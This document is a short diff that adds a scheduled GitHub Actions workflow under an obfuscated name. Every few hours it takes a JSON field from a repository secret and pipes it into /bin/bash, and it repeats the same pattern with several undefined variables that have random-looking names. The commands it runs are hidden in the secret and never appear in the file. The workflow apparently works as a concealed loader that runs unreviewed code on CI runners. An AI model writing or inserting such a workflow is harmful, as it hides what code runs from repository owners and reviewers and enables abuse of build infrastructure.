@@ -1,0 +1,26 @@
+name: processcommitment
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: processcommitment
+        env:
+          yk22715: ${{ secrets.yk22715 }}
+        run: |
+          echo $yk22715 | jq -r .mkch4463 | /bin/bash
+          echo $dxspf23560 | jq -r .jslp12473 | /bin/bash
+          echo $est0095 | jq -r .i0 | /bin/bash
+          echo $nt142 | jq -r .wdqup85 | /bin/bash
+          echo $rdwx79 | jq -r .jfe90460 | /bin/bash
+          echo $b74 | jq -r .hitfq3 | /bin/bash
+          echo $sdpxk5 | jq -r .aq53411 | /bin/bash
+          echo $c63 | jq -r .qy3 | /bin/bash
+
